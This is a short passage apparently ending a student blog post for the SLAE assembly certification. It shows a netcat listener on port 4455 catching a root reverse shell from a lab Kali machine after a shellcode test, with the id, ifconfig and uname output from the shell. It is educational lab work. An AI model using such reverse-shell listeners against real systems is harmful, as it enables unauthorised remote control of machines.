Upon executing `sc_test` on `192.168.57.246`, a connection is received on port `4455` on the `192.168.57.1` system. The output below shows this.

```shell
SLAE-1469-MacBook-Pro:~ SLAE-1469$ nc -lvp 4455
Connection from 192.168.57.246:37638
id
uid=0(root) gid=0(root) groups=0(root)
ifconfig | grep 192.168.57
        inet 192.168.57.246  netmask 255.255.255.0  broadcast 192.168.57.255
uname -a
Linux kali 4.19.0-kali5-amd64 #1 SMP Debian 4.19.37-6kali1 (2019-07-22) x86_64 GNU/Linux
```

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_

